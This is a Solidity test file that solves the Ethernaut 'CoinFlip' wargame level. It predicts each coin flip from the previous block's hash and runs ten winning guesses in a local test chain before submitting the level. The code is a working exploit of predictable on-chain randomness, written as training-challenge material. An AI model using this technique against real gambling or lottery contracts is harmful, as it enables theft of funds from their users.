pragma solidity ^0.8.10;

import "ds-test/test.sol";
import "src/03-CoinFlip/CoinFlipHack.sol";
import "src/03-CoinFlip/CoinFlipFactory.sol";
import "src/Ethernaut.sol";
import "../utils/vm.sol";

contract C_CoinFlipTest is DSTest {
    Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
    Ethernaut ethernaut;

    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function setUp() public {
        // Setup instance of the Ethernaut contracts
        ethernaut = new Ethernaut();
    }

    function testCoinFlipHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////

        CoinFlipFactory coinFlipFactory = new CoinFlipFactory();
        ethernaut.registerLevel(coinFlipFactory);
        vm.startPrank(tx.origin);
        address levelAddress = ethernaut.createLevelInstance(coinFlipFactory);
        CoinFlip ethernautCoinFlip = CoinFlip(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////

        for (uint8 i; i < 10; ++i) {
            uint256 coinflip = uint256(blockhash(block.number - 1)) / FACTOR ;
            bool guess = coinflip == 1 ? true : false;
            ethernautCoinFlip.flip(guess);
            emit log_named_uint("coinflip: ", coinflip);
            emit log_named_uint("wins : ", ethernautCoinFlip.consecutiveWins());
            vm.roll(block.number + 1);
        }

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////

        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assertTrue(levelSuccessfullyPassed);
    }
}